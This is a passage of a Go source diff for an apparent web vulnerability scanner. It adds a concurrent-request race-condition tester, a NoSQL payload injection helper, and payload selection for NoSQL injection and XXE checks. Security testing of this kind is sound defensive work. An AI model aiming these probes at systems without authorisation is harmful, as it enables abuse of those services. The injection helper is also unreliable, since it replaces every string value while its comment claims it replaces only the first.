+		Duration   time.Duration
+		Error      error
+	}
+
+	responses := make([]response, len(requests))
+	var wg sync.WaitGroup
+
+	// Fire all requests simultaneously
+	startBarrier := make(chan struct{})
+
+	for i, req := range requests {
+		wg.Add(1)
+		go func(idx int, r *http.Request) {
+			defer wg.Done()
+
+			// Wait for start signal
+			<-startBarrier
+
+			start := time.Now()
+
+			// Clone request body for each attempt
+			var body io.Reader
+			if opts.Data != "" {
+				body = strings.NewReader(opts.Data)
+			}
+			newReq, _ := http.NewRequest(r.Method, r.URL.String(), body)
+			newReq.Header = r.Header.Clone()
+
+			resp, err := client.Do(newReq)
+			elapsed := time.Since(start)
+
+			if err != nil {
+				responses[idx] = response{Error: err, Duration: elapsed}
+				return
+			}
+
+			bodyBytes, _ := io.ReadAll(resp.Body)
+			resp.Body.Close()
+
+			responses[idx] = response{
+				StatusCode: resp.StatusCode,
+				Body:       string(bodyBytes),
+				Duration:   elapsed,
+			}
+		}(i, req)
+	}
+
+	// Release all goroutines at once
+	close(startBarrier)
+	wg.Wait()
+
+	// Analyze results
+	statusCodes := make(map[int]int)
+	successCount := 0
+	var bodies []string
+	var durations []time.Duration
+
+	for _, resp := range responses {
+		if resp.Error != nil {
+			continue
+		}
+		statusCodes[resp.StatusCode]++
+		durations = append(durations, resp.Duration)
+
+		// Count successful operations
+		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
+			successCount++
+			bodies = append(bodies, resp.Body)
+		}
+	}
+
+	// Check for race condition indicators
+	// 1. Multiple successes when only one should occur
+	if successCount > 1 {
+		resultChan <- VulnResult{
+			Type:        VulnRace,
+			Severity:    SeverityHigh,
+			URL:         opts.URL,
+			Parameter:   fmt.Sprintf("%d concurrent requests", opts.Requests),
+			Payload:     opts.Data,
+			Evidence:    fmt.Sprintf("%d/%d requests succeeded (expected 1)", successCount, opts.Requests),
+			Description: "Race condition detected. Multiple concurrent requests succeeded when only one should.",
+			Remediation: "Implement proper locking/mutex. Use database transactions with row-level locking.",
+		}
+	}
+
+	// 2. Different responses to identical requests
+	uniqueResponses := make(map[string]int)
+	for _, body := range bodies {
+		// Normalize response (remove timestamps, etc.)
+		normalized := normalizeResponse(body)
+		uniqueResponses[normalized]++
+	}
+
+	if len(uniqueResponses) > 1 && len(bodies) > 2 {
+		resultChan <- VulnResult{
+			Type:        VulnRace,
+			Severity:    SeverityMedium,
+			URL:         opts.URL,
+			Parameter:   "Response Inconsistency",
+			Payload:     opts.Data,
+			Evidence:    fmt.Sprintf("%d unique responses from %d requests", len(uniqueResponses), len(bodies)),
+			Description: "Inconsistent responses detected. The application may have TOCTOU vulnerabilities.",
+			Remediation: "Ensure atomic operations. Review state management for race conditions.",
+		}
+	}
+
+	// 3. Timing analysis - large variance may indicate race
+	if len(durations) > 2 {
+		var totalDuration time.Duration
+		minDuration := durations[0]
+		maxDuration := durations[0]
+
+		for _, d := range durations {
+			totalDuration += d
+			if d < minDuration {
+				minDuration = d
+			}
+			if d > maxDuration {
+				maxDuration = d
+			}
+		}
+
+		avgDuration := totalDuration / time.Duration(len(durations))
+		variance := maxDuration - minDuration
+
+		// High variance with some very fast responses may indicate bypassed checks
+		if variance > 2*avgDuration && minDuration < avgDuration/2 {
+			resultChan <- VulnResult{
+				Type:        VulnRace,
+				Severity:    SeverityLow,
+				URL:         opts.URL,
+				Parameter:   "Timing Analysis",
+				Payload:     opts.Data,
+				Evidence:    fmt.Sprintf("High timing variance: min=%v, max=%v, avg=%v", minDuration, maxDuration, avgDuration),
+				Description: "High response time variance detected. Some requests may have bypassed validation.",
+				Remediation: "Review server-side validation timing. Implement consistent processing.",
+			}
+		}
+	}
+
+	// Summary
+	if len(statusCodes) > 0 {
+		statusSummary := ""
+		for code, count := range statusCodes {
+			statusSummary += fmt.Sprintf("%d(%dx) ", code, count)
+		}
+		resultChan <- VulnResult{
+			Type:        VulnRace,
+			Severity:    SeverityInfo,
+			URL:         opts.URL,
+			Parameter:   "Summary",
+			Evidence:    fmt.Sprintf("Status codes: %s", statusSummary),
+			Description: "Race condition test completed.",
+			Remediation: "Review results for anomalies.",
+		}
+	}
+}
+
+// Helper function to normalize response for comparison
+func normalizeResponse(body string) string {
+	// Remove common dynamic elements
+	patterns := []string{
+		`"timestamp":\s*"[^"]*"`,
+		`"time":\s*\d+`,
+		`"date":\s*"[^"]*"`,
+		`"id":\s*"[^"]*"`,
+		`"request_id":\s*"[^"]*"`,
+	}
+
+	result := body
+	for _, pattern := range patterns {
+		re := regexp.MustCompile(pattern)
+		result = re.ReplaceAllString(result, "")
+	}
+	return result
+}
+
+// Helper to inject NoSQL payload into JSON
+func injectNoSQLPayload(jsonData, payload string) string {
+	// Simple injection: replace string values with payload
+	// This is a basic implementation - could be enhanced
+	if strings.Contains(jsonData, `":"`) {
+		// Replace first string value
+		re := regexp.MustCompile(`":\s*"[^"]*"`)
+		return re.ReplaceAllStringFunc(jsonData, func(match string) string {
+			// Only replace first occurrence
+			return `": ` + payload
+		})
+	}
+	return ""
+}
+
 // ScanSecurityHeaders analyzes security headers
 func ScanSecurityHeaders(opts ScanOptions) []VulnResult {
 	var results []VulnResult
@@ -1003,6 +2157,13 @@ func GetPayloads(vulnType VulnType, level int) []string {
 		return CmdInjPayloads[2]
 	case VulnOpen:
 		return OpenRedirectPayloads
+	case VulnNoSQLi:
+		if p, ok := NoSQLiPayloads[level]; ok {
+			return p
+		}
+		return NoSQLiPayloads[2]
+	case VulnXXE:
+		return XXEPayloads
 	default:
 		return nil
 	}
